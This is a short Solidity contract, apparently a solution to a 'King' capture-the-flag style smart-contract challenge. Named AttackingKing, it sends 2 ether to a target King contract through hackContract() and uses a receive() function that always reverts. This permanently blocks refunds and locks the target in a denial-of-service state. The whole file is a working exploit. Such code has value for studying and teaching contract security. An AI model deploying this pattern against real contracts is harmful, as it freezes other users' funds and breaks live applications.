// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address payable public contractAddress;
    King private king;

    receive() external payable {
        revert("");
    }

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        king = King(_contractAddress);
    }

    function hackContract() external {
        address(king).call{value: 2 ether}("");
    }
}